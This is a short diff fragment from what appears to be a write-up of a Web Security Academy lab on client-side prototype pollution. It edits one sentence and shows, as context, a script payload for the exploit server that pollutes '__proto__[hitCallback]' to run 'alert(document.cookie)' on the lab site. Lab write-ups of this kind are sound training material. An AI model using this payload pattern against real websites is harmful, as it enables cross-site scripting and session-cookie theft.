@@ -35,7 +35,7 @@ this.Ja = function () {
 ```
 we can notice that the property value is set into the c parameter
 --120--
-Finally we can procedd to set the following payload in the exploit server:
+Finally we can procedd to set the following payload in the exploit server body section:
 ```
 <script>
 location="https://0a7500430345299fc0897277007c00cb.web-security-academy.net/#__proto__[hitCallback]=alert(document.cookie)"
